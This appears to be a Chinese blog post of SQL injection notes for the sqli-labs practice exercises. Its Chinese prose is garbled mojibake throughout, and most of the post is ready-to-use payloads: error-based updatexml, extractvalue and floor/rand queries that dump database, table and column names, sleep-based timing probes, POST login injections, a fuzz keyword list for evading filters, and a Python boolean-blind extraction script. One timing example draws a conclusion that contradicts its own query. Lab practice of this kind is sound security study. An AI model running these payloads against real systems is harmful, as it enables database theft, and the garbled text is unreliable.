<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">å…¶ä¸­payloadä¸ºä½ è¦æ’å…¥çš„SQLè¯­å¥éœ€è¦æ³¨æ„çš„æ˜¯è¯¥è¯­å¥å°† è¾“å‡ºå­—ç¬¦é•¿åº¦é™åˆ¶ä¸º32ä¸ªå­—ç¬¦</span><br><span class="line"></span><br><span class="line">(1). é€šè¿‡updatexmlæŠ¥é”™</span><br><span class="line">and updatexml(1,concat(0x7e,SUBSTR((payload),1,24),0x7e),1) </span><br><span class="line">and updatexml(1,concat(0x7e,SUBSTR((database()),1,24),0x7e),1)</span><br><span class="line">and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br><span class="line"></span><br><span class="line">éœ€è¦é…åˆsubsträ½¿ç”¨</span><br><span class="line">åŒæ ·è¯¥è¯­å¥å¯¹è¾“å‡ºçš„å­—ç¬¦é•¿åº¦ä¹Ÿåšäº†é™åˆ¶ï¼Œå…¶æœ€é•¿è¾“å‡º32ä½å¹¶ä¸”è¯¥è¯­å¥å¯¹payloadçš„è¿”å›ç±»å‹ä¹Ÿåšäº†é™åˆ¶ï¼Œåªæœ‰åœ¨payloadè¿”å›çš„ä¸æ˜¯xmlæ ¼å¼æ‰ä¼šç”Ÿæ•ˆ</span><br><span class="line"></span><br><span class="line">(2). é€šè¿‡ExtractValueæŠ¥é”™</span><br><span class="line">and extractvalue(1,concat(0x26,substr((payload),1,24),0x26)) and &#39;1&#39;&#x3D;&#39;1 --+</span><br><span class="line"></span><br><span class="line">è¾“å‡ºå­—ç¬¦æœ‰é•¿åº¦é™åˆ¶ï¼Œæœ€é•¿32ä½ã€‚</span><br><span class="line"></span><br><span class="line">ç„¶åå°±æ„é€ payload</span><br></pre></td></tr></table></figure>
<h2 id="åŒæŸ¥è¯¢æ³¨å…¥ï¼ˆfloorï¼‰"><a href="#åŒæŸ¥è¯¢æ³¨å…¥ï¼ˆfloorï¼‰" class="headerlink" title="åŒæŸ¥è¯¢æ³¨å…¥ï¼ˆfloorï¼‰"></a>åŒæŸ¥è¯¢æ³¨å…¥ï¼ˆfloorï¼‰</h2><p>ä¾‹é¢˜ï¼šless5</p>
<p>åŸç†ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é€šè¿‡flooræŠ¥é”™çš„æ–¹æ³•æ¥çˆ†æ•°æ®çš„æœ¬è´¨æ˜¯group byè¯­å¥çš„æŠ¥é”™ã€‚group byè¯­å¥æŠ¥é”™çš„åŸå› æ˜¯floor(random(0)*2)çš„ä¸ç¡®å®šæ€§ï¼Œå³å¯èƒ½ä¸º0ä¹Ÿå¯èƒ½ä¸º1ï¼ˆgroup by keyçš„åŸç†æ˜¯å¾ªç¯è¯»å–æ•°æ®çš„æ¯ä¸€è¡Œï¼Œå°†ç»“æœä¿å­˜äºä¸´æ—¶è¡¨ä¸­ã€‚è¯»å–æ¯ä¸€è¡Œçš„keyæ—¶ï¼Œå¦‚æœkeyå­˜åœ¨äºä¸´æ—¶è¡¨ä¸­ï¼Œåˆ™ä¸åœ¨ä¸´æ—¶è¡¨ä¸­åˆ™æ›´æ–°ä¸´æ—¶è¡¨ä¸­çš„æ•°æ®ï¼›å¦‚æœè¯¥keyä¸å­˜åœ¨äºä¸´æ—¶è¡¨ä¸­ï¼Œåˆ™åœ¨ä¸´æ—¶è¡¨ä¸­æ’å…¥keyæ‰€åœ¨è¡Œçš„æ•°æ®ã€‚group by floor(random(0)*2)å‡ºé”™çš„åŸå› æ˜¯keyæ˜¯ä¸ªéšæœºæ•°ï¼Œæ£€æµ‹ä¸´æ—¶è¡¨ä¸­keyæ˜¯å¦å­˜åœ¨æ—¶è®¡ç®—äº†ä¸€ä¸‹floor(random(0)*2)å¯èƒ½ä¸º0ï¼Œå¦‚æœæ­¤æ—¶ä¸´æ—¶è¡¨åªæœ‰keyä¸º1çš„è¡Œä¸å­˜åœ¨keyä¸º0çš„è¡Œï¼Œé‚£ä¹ˆæ•°æ®åº“è¦å°†è¯¥æ¡è®°å½•æ’å…¥ä¸´æ—¶è¡¨ï¼Œç”±äºæ˜¯éšæœºæ•°ï¼Œæ’æ—¶åˆè¦è®¡ç®—ä¸€ä¸‹éšæœºå€¼ï¼Œæ­¤æ—¶floor(random(0)*2)ç»“æœå¯èƒ½ä¸º1ï¼Œå°±ä¼šå¯¼è‡´æ’å…¥æ—¶å†²çªè€ŒæŠ¥é”™ã€‚å³æ£€æµ‹æ—¶å’Œæ’å…¥æ—¶ä¸¤æ¬¡è®¡ç®—äº†éšæœºæ•°çš„å€¼ã€‚</span><br></pre></td></tr></table></figure>
<p>è¯­å¥æ ¼å¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#æ³¨æ„payloadè¦æœ‰æ‹¬å·</span><br><span class="line">?id&#x3D;-1&#39; union select 1,count(*),concat( (payload),floor(rand(0)*2)  ) as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># çˆ†æ•°æ®åº“å</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,count(*),concat( (select database()),floor(rand(0)*2)  ) as a from information_schema.tables group by a --+</span></span><br><span class="line"><span class="string"># çˆ†è¡¨åï¼Œæ³¨æ„è¡¨åè¿‡å¤šï¼Œæ‰€ä»¥è¦é€ä¸ªçˆ† limit i,1</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="built_in">count</span>(<span class="operator">*</span>),concat( (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)  ) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">--+</span></span><br><span class="line"># çˆ†åˆ—å</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,count(*),concat( (select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1),floor(rand(0)*2)  ) as a from information_schema.tables group by a --+</span></span><br></pre></td></tr></table></figure>
<h1 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h1><p>ä¾‹é¢˜ï¼šless8</p>
<p>é€‚ç”¨åœºæ™¯ï¼šä¸è¿”å›æŠ¥é”™ä¿¡æ¯ï¼Œä½†æ˜¯æ ¹æ®sqlè¯­å¥æ­£ç¡®æ€§ä¼šæœ‰ä¸åŒçš„å›æ˜¾</p>
<p>è„šæœ¬æ¨¡æ¿</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ­¤è„šæœ¬ä¸ºè¿”å›æ•°æ®åº“åï¼Œæ›¿æ¢database()å¤„å³å¯</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://192.168.64.2/sqllabs/Less-8?id=1&#x27; and %s--+&quot;</span></span><br><span class="line"></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line">success_text = <span class="string">&quot;You are in...........&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">	flag = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>):</span><br><span class="line">		c = <span class="built_in">chr</span>(j)</span><br><span class="line">		s = <span class="string">&quot;substr(database(),&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1)=&#x27;&quot;</span> + c + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">		response = requests.get(url%s)</span><br><span class="line">		print(url%s)</span><br><span class="line">		<span class="keyword">if</span> success_text <span class="keyword">in</span> response.text:</span><br><span class="line">			flag = <span class="number">1</span></span><br><span class="line">			ans = ans + c</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure>


<h2 id="if"><a href="#if" class="headerlink" title="if"></a>if</h2><p>æœ€å¸¸è§„çš„</p>
<h2 id=""><a href="#" class="headerlink" title="^"></a>^</h2><p>1^1=0ï¼Œ1^0=1ï¼Œç”¨äºè¿‡æ»¤äº†ifçš„æŠ¥é”™æ³¨å…¥</p>
<h2 id="å­—ç¬¦å¤§å°æ¯”è¾ƒ"><a href="#å­—ç¬¦å¤§å°æ¯”è¾ƒ" class="headerlink" title="å­—ç¬¦å¤§å°æ¯”è¾ƒ"></a>å­—ç¬¦å¤§å°æ¯”è¾ƒ</h2><p>å¯ç”¨äºifè¢«è¿‡æ»¤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select &#39;&#123;&#125;&#39;)&gt;(select * from f1ag_1s_h3r3_hhhhh)</span><br></pre></td></tr></table></figure>


<h2 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h2><p>å¯ç”¨äºifè¢«è¿‡æ»¤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user() regexp &#39;^r&#39; # ä»user()ä¸­åˆ¤æ–­æ˜¯å¦æœ‰ä»¥rå­—æ¯å¼€å¤´çš„å€¼ï¼Œæœ‰çš„è¯è¿”å›1</span><br></pre></td></tr></table></figure>
<h2 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h2><p>ä¾‹é¢˜ï¼šless9ã€10</p>
<p>é€‚ç”¨æƒ…å†µï¼šèƒ½æ‰§è¡Œsleep()å‡½æ•°</p>
<p>åˆ¤æ–­ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> ?id&#x3D;1&#39; and sleep(5) --+</span><br><span class="line">å»¶æ—¶å¤§æ¦‚5ç§’ï¼Œè¯´æ˜å¯ä»¥é‡‡ç”¨æ—¶é—´ç›²æ³¨</span><br></pre></td></tr></table></figure>
<p>è¯­å¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;sqli&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(length(database())&#x3D;7,sleep(5),1)%20--+</span><br><span class="line">æœ‰å»¶è¿Ÿï¼Œè¯´æ˜æ•°æ®åº“åç§°é•¿åº¦ä¸º8</span><br></pre></td></tr></table></figure>
<h1 id="sqlå¸¸è§„å…³é”®å­—fuzzå­—å…¸"><a href="#sqlå¸¸è§„å…³é”®å­—fuzzå­—å…¸" class="headerlink" title="sqlå¸¸è§„å…³é”®å­—fuzzå­—å…¸"></a>sqlå¸¸è§„å…³é”®å­—fuzzå­—å…¸</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line">å‚è€ƒï¼šhttps:&#x2F;&#x2F;www.cnblogs.com&#x2F;zhangqianxi&#x2F;p&#x2F;13452718.html</span><br><span class="line">length</span><br><span class="line">Length</span><br><span class="line">+</span><br><span class="line">handler</span><br><span class="line">likeLiKe</span><br><span class="line">selectSeleCT </span><br><span class="line">sleepSLEEp</span><br><span class="line">databaseDATABASe</span><br><span class="line">delete</span><br><span class="line">having</span><br><span class="line">oroR</span><br><span class="line">asAs</span><br><span class="line">-~</span><br><span class="line">BENCHMARK</span><br><span class="line">limitLimIt</span><br><span class="line">leftLeft</span><br><span class="line">selectSELECT</span><br><span class="line">insertinsERTINSERT</span><br><span class="line">right</span><br><span class="line">#</span><br><span class="line">--+</span><br><span class="line">INFORMATION</span><br><span class="line">--</span><br><span class="line">;</span><br><span class="line">!</span><br><span class="line">%</span><br><span class="line">+</span><br><span class="line">xor</span><br><span class="line">&lt;&gt;</span><br><span class="line">(</span><br><span class="line">&gt;</span><br><span class="line">&lt;</span><br><span class="line">)</span><br><span class="line">.</span><br><span class="line">^</span><br><span class="line">&#x3D;</span><br><span class="line">ANDANd</span><br><span class="line">BYBy</span><br><span class="line">CAST</span><br><span class="line">COLUMNCOlumn</span><br><span class="line">COUNTCount</span><br><span class="line">CREATE</span><br><span class="line">END</span><br><span class="line">case</span><br><span class="line">&#39;1&#39;&#x3D;&#39;1</span><br><span class="line">when</span><br><span class="line">admin&#39;</span><br><span class="line">&quot;</span><br><span class="line">length </span><br><span class="line">+</span><br><span class="line">REVERSE</span><br><span class="line"></span><br><span class="line">asciiASSICASSic</span><br><span class="line">select </span><br><span class="line">database</span><br><span class="line">left</span><br><span class="line">right</span><br><span class="line">unionUNIonUNION</span><br><span class="line">&quot;</span><br><span class="line">&amp;</span><br><span class="line">&amp;&amp;</span><br><span class="line">||</span><br><span class="line">oorr</span><br><span class="line">&#x2F;</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;*</span><br><span class="line">*&#x2F;*</span><br><span class="line">&#x2F;**&#x2F;</span><br><span class="line">anandd</span><br><span class="line">GROUP</span><br><span class="line">HAVING</span><br><span class="line">IF</span><br><span class="line">INTO</span><br><span class="line">JOIN</span><br><span class="line">LEAVE</span><br><span class="line">LEFT</span><br><span class="line">LEVEL</span><br><span class="line">sleep</span><br><span class="line">LIKE</span><br><span class="line">NAMES</span><br><span class="line">NEXT</span><br><span class="line">NULL</span><br><span class="line">OF</span><br><span class="line">ON</span><br><span class="line">|</span><br><span class="line">infromation_schema</span><br><span class="line">user</span><br><span class="line">OR</span><br><span class="line">ORDER</span><br><span class="line">ORD</span><br><span class="line">SCHEMA</span><br><span class="line">SELECT</span><br><span class="line">SET</span><br><span class="line">TABLE</span><br><span class="line">THEN</span><br><span class="line">UNION</span><br><span class="line">UPDATE</span><br><span class="line">USER</span><br><span class="line">USING</span><br><span class="line">VALUE</span><br><span class="line">VALUES</span><br><span class="line">WHEN</span><br><span class="line">WHERE</span><br><span class="line">ADD</span><br><span class="line">AND</span><br><span class="line">prepare</span><br><span class="line">set</span><br><span class="line">update</span><br><span class="line">delete</span><br><span class="line">drop</span><br><span class="line">inset</span><br><span class="line">CAST</span><br><span class="line">COLUMN</span><br><span class="line">CONCAT</span><br><span class="line">GROUP_CONCAT</span><br><span class="line">group_concat</span><br><span class="line">CREATE</span><br><span class="line">DATABASE</span><br><span class="line">DATABASES</span><br><span class="line">alter</span><br><span class="line">DELETE</span><br><span class="line">DROP</span><br><span class="line">floor</span><br><span class="line">rand()</span><br><span class="line">information_schema.tables</span><br><span class="line">TABLE_SCHEMA</span><br><span class="line">%df</span><br><span class="line">concat_ws()</span><br><span class="line">concat</span><br><span class="line">LIMIT</span><br><span class="line">ORD</span><br><span class="line">ON</span><br><span class="line">extractvalue</span><br><span class="line">order </span><br><span class="line">CAST()</span><br><span class="line">by</span><br><span class="line">ORDER</span><br><span class="line">OUTFILE</span><br><span class="line">RENAME</span><br><span class="line">REPLACE</span><br><span class="line">SCHEMA</span><br><span class="line">SELECT</span><br><span class="line">SET</span><br><span class="line">updatexml</span><br><span class="line">SHOW</span><br><span class="line">SQL</span><br><span class="line">TABLE</span><br><span class="line">THEN</span><br><span class="line">TRUE</span><br><span class="line">instr</span><br><span class="line">benchmark</span><br><span class="line">format</span><br><span class="line">bin</span><br><span class="line">substring</span><br><span class="line">ord</span><br><span class="line"></span><br><span class="line">UPDATE</span><br><span class="line">VALUES</span><br><span class="line">VARCHAR</span><br><span class="line">VERSION</span><br><span class="line">WHEN</span><br><span class="line">WHERE</span><br><span class="line">&#x2F;*</span><br><span class="line">&#96;</span><br><span class="line">  </span><br><span class="line">,</span><br><span class="line">users</span><br><span class="line">%0a%0A</span><br><span class="line">%0b</span><br><span class="line">mid</span><br><span class="line">for</span><br><span class="line">BEFORE</span><br><span class="line">REGEXP</span><br><span class="line">RLIKE</span><br><span class="line">in</span><br><span class="line">sys schemma</span><br><span class="line">SEPARATOR</span><br><span class="line">XOR</span><br><span class="line">CURSOR</span><br><span class="line">FLOOR</span><br><span class="line">sys.schema_table_statistics_with_buffer</span><br><span class="line">INFILE</span><br><span class="line">count</span><br><span class="line">%0c</span><br><span class="line">from</span><br><span class="line">%0d</span><br><span class="line">%a0</span><br><span class="line">&#x3D;</span><br><span class="line">@</span><br><span class="line">else</span><br><span class="line">or</span><br><span class="line">Or</span><br></pre></td></tr></table></figure>


<h1 id="regexp-1"><a href="#regexp-1" class="headerlink" title="regexp"></a>regexp</h1><p>ç”¨äºæ˜¾ç¤ºä¸å…¨ï¼Œä½¿ç”¨æ­£åˆ™åŒ¹é…æœç´¢åŒ¹é…çš„flagçš„æƒ…å†µ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)</span><br></pre></td></tr></table></figure>


<h1 id="sqllabé¢˜ç›®"><a href="#sqllabé¢˜ç›®" class="headerlink" title="sqllabé¢˜ç›®"></a>sqllabé¢˜ç›®</h1><h2 id="Less5"><a href="#Less5" class="headerlink" title="Less5"></a>Less5</h2><p>åšæ³•1ï¼šcount()å’Œfloor()çš„æŸ¥è¯¢æ³¨å…¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># çˆ†æ•°æ®åº“å</span><br><span class="line">?id&#x3D;-1&#39; union select 1,count(*),concat( (select database()),floor(rand(0)*2)  ) as a from information_schema.tables group by a --+</span><br><span class="line"># çˆ†è¡¨åï¼Œæ³¨æ„è¡¨åè¿‡å¤šï¼Œæ‰€ä»¥è¦é€ä¸ªçˆ† limit i,1</span><br><span class="line">?id&#x3D;-1&#39; union select 1,count(*),concat( (select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),floor(rand(0)*2)  ) as a from information_schema.tables group by a --+</span><br><span class="line"># çˆ†åˆ—å</span><br><span class="line">id&#x3D;-1&#39; union select 1,count(*),concat( (select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),floor(rand(0)*2)  ) as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure>
<p>åšæ³•2ï¼šupdatexml()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># çˆ†æ•°æ®åº“å</span><br><span class="line">?id&#x3D;-1&#39; and updatexml(1,concat(&#39;~&#39;,database()),1) --+</span><br><span class="line">åé¢æŠŠpayloadæ›¿æ¢ä¸€ä¸‹</span><br></pre></td></tr></table></figure>
<h2 id="Less6"><a href="#Less6" class="headerlink" title="Less6"></a>Less6</h2><p>ä¸Less5ç›¸åŒï¼ŒLess5ä¸ºå•å¼•å·ï¼Œæœ¬é¢˜ä¸ºåŒå¼•å·</p>
<h2 id="Less7"><a href="#Less7" class="headerlink" title="Less7"></a>Less7</h2><p>è·³è¿‡ ï¼Œç¯å¢ƒæœ‰é—®é¢˜</p>
<h2 id="Less8"><a href="#Less8" class="headerlink" title="Less8"></a>Less8</h2><p>è€ƒå¯Ÿï¼šå¸ƒå°”ç›²æ³¨</p>
<p>ä¸è¿”å›æŠ¥é”™ä¿¡æ¯ï¼Œä½†æ˜¯æ ¹æ®sqlè¯­å¥æ­£ç¡®æ€§ä¼šæœ‰ä¸åŒçš„å›æ˜¾</p>
<p>ä»¥ä¸‹è„šæœ¬ï¼Œæ³¨æ„æ•°æ®åº“é€ä½åˆ¤æ–­å¤„ä¸ºä¸€ä¸ªç­‰å·</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://192.168.64.2/sqllabs/Less-8?id=1&#x27; and %s--+&quot;</span></span><br><span class="line"></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line">success_text = <span class="string">&quot;You are in...........&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">	flag = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>):</span><br><span class="line">		c = <span class="built_in">chr</span>(j)</span><br><span class="line">		s = <span class="string">&quot;substr(database(),&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1)=&#x27;&quot;</span> + c + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">		response = requests.get(url%s)</span><br><span class="line">		print(url%s)</span><br><span class="line">		<span class="keyword">if</span> success_text <span class="keyword">in</span> response.text:</span><br><span class="line">			flag = <span class="number">1</span></span><br><span class="line">			ans = ans + c</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure>
<h2 id="Less9"><a href="#Less9" class="headerlink" title="Less9"></a>Less9</h2><p>è€ƒå¯Ÿï¼šæ—¶é—´ç›²æ³¨</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨æ—¶é—´ç›²æ³¨</span><br><span class="line">    ?id&#x3D;1&#39; and sleep(5) --+</span><br><span class="line">å»¶æ—¶å¤§æ¦‚5ç§’ï¼Œè¯´æ˜å¯ä»¥é‡‡ç”¨æ—¶é—´ç›²æ³¨</span><br><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;sqli&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(length(database())&#x3D;7,sleep(5),1)%20--+</span><br><span class="line">æœ‰å»¶è¿Ÿï¼Œè¯´æ˜æ•°æ®åº“åç§°é•¿åº¦ä¸º8</span><br></pre></td></tr></table></figure>
<h2 id="Less11"><a href="#Less11" class="headerlink" title="Less11"></a>Less11</h2><p>è€ƒå¯Ÿï¼špostæ³¨å…¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æ–¹æ³•1ï¼šæŠ¥é”™æ³¨å…¥</span><br><span class="line">	postæ•°æ®ï¼šuname&#x3D;admin1&#39; union select 1,database() #&amp;passwd&#x3D;1</span><br><span class="line">æ–¹æ³•2ï¼šåŒæŸ¥è¯¢æ³¨å…¥</span><br><span class="line">	postæ•°æ®ï¼šuname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1,concat(&#39;~&#39;,database()),1) #</span><br><span class="line">	ä¹‹åä¸Less5ç›¸åŒ</span><br></pre></td></tr></table></figure>
